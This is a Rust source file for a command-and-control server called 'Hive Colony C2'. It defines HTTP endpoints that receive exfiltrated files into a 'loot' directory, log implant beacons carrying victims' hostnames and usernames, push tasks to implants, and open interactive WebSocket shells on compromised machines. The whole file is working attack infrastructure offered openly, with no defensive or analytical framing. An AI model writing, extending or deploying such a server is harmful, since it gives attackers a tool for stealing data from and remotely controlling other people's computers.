mod db;
mod session;
mod shell;

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;

use axum::{
    extract::{Path, Query, State, WebSocketUpgrade},
    http::StatusCode,
    response::{Html, IntoResponse, Json},
    routing::{get, post},
    Router,
};
use base64::Engine;
use clap::Parser;
use serde::{Deserialize, Serialize};
use tokio::sync::Mutex;
use tower_http::cors::CorsLayer;

use db::Db;
use session::SessionManager;

#[derive(Parser)]
#[command(name = "hive-c2", about = "Hive Colony C2 Server")]
struct Args {
    #[arg(long, default_value = "8444")]
    port: u16,

    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    #[arg(long, default_value = "./loot")]
    loot_dir: PathBuf,

    #[arg(long, default_value = "hive_c2.db")]
    db_path: PathBuf,
}

#[derive(Clone)]
struct AppState {
    db: Arc<Mutex<Db>>,
    sessions: Arc<Mutex<SessionManager>>,
    loot_dir: PathBuf,
}

#[derive(Serialize)]
struct HealthResponse {
    status: &'static str,
    exfil_count: usize,
    beacon_count: usize,
    sessions: usize,
}

#[derive(Deserialize)]
struct BeaconPayload {
    #[serde(default)]
    agent_id: String,
    #[serde(default)]
    agent_role: String,
    #[serde(default)]
    hostname: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    os: String,
    #[serde(default)]
    version: String,
    #[serde(flatten)]
    extra: std::collections::HashMap<String, serde_json::Value>,
}

#[derive(Serialize, Deserialize, Clone)]
struct Task {
    id: String,
    command: String,
    payload: serde_json::Value,
}

#[derive(Serialize)]
struct TaskResponse {
    tasks: Vec<Task>,
}

#[derive(Deserialize)]
struct CollectQuery {
    #[serde(default)]
    filename: String,
}

#[derive(Serialize)]
struct CollectResponse {
    status: &'static str,
    sha256: String,
    size: usize,
}

#[derive(Serialize)]
struct LogEntry {
    timestamp: String,
    agent_id: String,
    agent_role: String,
    #[serde(flatten)]
    data: serde_json::Value,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
        .init();

    let args = Args::parse();

    std::fs::create_dir_all(&args.loot_dir).expect("Failed to create loot directory");

    let db = Db::open(&args.db_path).expect("Failed to open database");
    let sessions = SessionManager::new();
    let state = AppState {
        db: Arc::new(Mutex::new(db)),
        sessions: Arc::new(Mutex::new(sessions)),
        loot_dir: args.loot_dir,
    };

    let app = Router::new()
        .route("/health", get(health_handler))
        .route("/", get(index_handler))
        .route("/logs", get(logs_handler))
        .route("/collect", post(collect_handler))
        .route("/beacon", post(beacon_handler))
        .route("/task/{agent_id}", get(task_handler))
        .route("/task/{agent_id}", post(task_push_handler))
        .route("/shell/{session_id}", get(shell_handler))
        .route("/admin/sessions", get(admin_sessions_handler))
        .route("/admin/agents", get(admin_agents_handler))
        .layer(CorsLayer::permissive())
        .with_state(state);

    let addr = SocketAddr::new(
        args.host.parse().expect("Invalid host address"),
        args.port,
    );
    tracing::info!("C2 Server listening on http://{addr}");
    tracing::info!("  POST /collect   - Receive exfiltrated data");
    tracing::info!("  POST /beacon    - Agent heartbeats");
    tracing::info!("  GET  /task/:id  - Task pull");
    tracing::info!("  GET  /shell/:id - WebSocket interactive shell");
    tracing::info!("  GET  /health    - Health check");
    tracing::info!("  GET  /logs      - Recent activity");

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
    let db = state.db.lock().await;
    let (exfil_count, beacon_count) = db.counts();

    Json(HealthResponse {
        status: "ok",
        exfil_count,
        beacon_count,
        sessions: 0,
    })
}

async fn index_handler() -> Html<&'static str> {
    Html(r#"<!DOCTYPE html>
<html><head><title>Hive C2</title>
<style>
body{background:#0a0e14;color:#bfc7d5;font-family:monospace;padding:20px}
h1{color:#73d0a0}a{color:#5ccfe6}
.card{background:#131821;border:1px solid #1e2a3a;border-radius:6px;padding:12px;margin:8px 0}
</style></head><body>
<h1>HIVE C2 SERVER</h1>
<div class=card>
<a href=/health>/health</a> — Health check<br>
<a href=/logs>/logs</a> — Recent activity<br>
<a href=/admin/agents>/admin/agents</a> — Registered agents<br>
<a href=/admin/sessions>/admin/sessions</a> — Shell sessions<br>
</div>
<p style=color:#5c6773>Hive Colony v3.0 — Rust C2</p>
</body></html>"#)
}

async fn logs_handler(State(state): State<AppState>) -> Json<Vec<LogEntry>> {
    let db = state.db.lock().await;
    Json(db.recent_activity(50))
}

async fn collect_handler(
    State(state): State<AppState>,
    Query(query): Query<CollectQuery>,
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> Result<Json<CollectResponse>, StatusCode> {
    let agent_id = headers
        .get("x-agent-id")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");
    let agent_role = headers
        .get("x-agent-role")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");

    let filename = if query.filename.is_empty() {
        headers
            .get("x-file-name")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("data.bin")
            .to_string()
    } else {
        query.filename
    };

    let raw: Vec<u8> = if headers
        .get("content-transfer-encoding")
        .and_then(|v| v.to_str().ok())
        == Some("base64")
    {
        base64::engine::general_purpose::STANDARD
            .decode(&body)
            .unwrap_or_else(|_| body.to_vec())
    } else {
        body.to_vec()
    };

    let hash = {
        use sha2::Digest;
        let mut h = sha2::Sha256::new();
        h.update(&raw);
        hex::encode(h.finalize())
    };
    let size = raw.len();

    let safe_name = filename.replace('/', "_").replace('\\', "_");
    let ts = chrono::Utc::now().format("%Y%m%d_%H%M%S");
    let filepath = state.loot_dir.join(format!("{ts}_{safe_name}"));

    tokio::fs::write(&filepath, &raw)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    {
        let db = state.db.lock().await;
        db.record_exfil(&agent_id, &agent_role, &filename, size, &hash, &filepath);
    }

    tracing::info!(agent = %agent_id, role = %agent_role, file = %filename, size = %size, "Exfil received");

    Ok(Json(CollectResponse {
        status: "received",
        sha256: hash,
        size,
    }))
}

async fn beacon_handler(
    State(state): State<AppState>,
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> Json<serde_json::Value> {
    let agent_id = headers
        .get("x-agent-id")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");
    let agent_role = headers
        .get("x-agent-role")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");

    let payload: BeaconPayload = serde_json::from_slice(&body).unwrap_or(BeaconPayload {
        agent_id: agent_id.to_string(),
        agent_role: agent_role.to_string(),
        hostname: String::new(),
        username: String::new(),
        os: String::new(),
        version: String::new(),
        extra: std::collections::HashMap::new(),
    });

    {
        let db = state.db.lock().await;
        db.record_beacon(
            &payload.agent_id,
            &payload.agent_role,
            &payload.hostname,
            &payload.username,
            &payload.os,
            &payload.version,
            &serde_json::to_value(&payload.extra).unwrap_or_default(),
        );
    }

    tracing::info!(agent = %agent_id, role = %agent_role, "Beacon received");

    Json(serde_json::json!({
        "status": "ack",
        "beacon_count": 0,
    }))
}

async fn task_handler(
    State(state): State<AppState>,
    Path(agent_id): Path<String>,
) -> Json<TaskResponse> {
    let db = state.db.lock().await;
    let tasks = db.pending_tasks(&agent_id);
    Json(TaskResponse { tasks })
}

async fn task_push_handler(
    State(state): State<AppState>,
    Path(agent_id): Path<String>,
    Json(task): Json<Task>,
) -> StatusCode {
    let db = state.db.lock().await;
    db.push_task(&agent_id, &task.id, &task.command, &task.payload);
    tracing::info!(agent = %agent_id, command = %task.command, "Task pushed");
    StatusCode::CREATED
}

async fn shell_handler(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| shell::handle_shell(socket, state, session_id))
}

async fn admin_sessions_handler(
    State(state): State<AppState>,
) -> Json<Vec<shell::SessionInfo>> {
    let sessions = state.sessions.lock().await;
    Json(sessions.list())
}

async fn admin_agents_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
    let db = state.db.lock().await;
    Json(db.agent_summary())
}
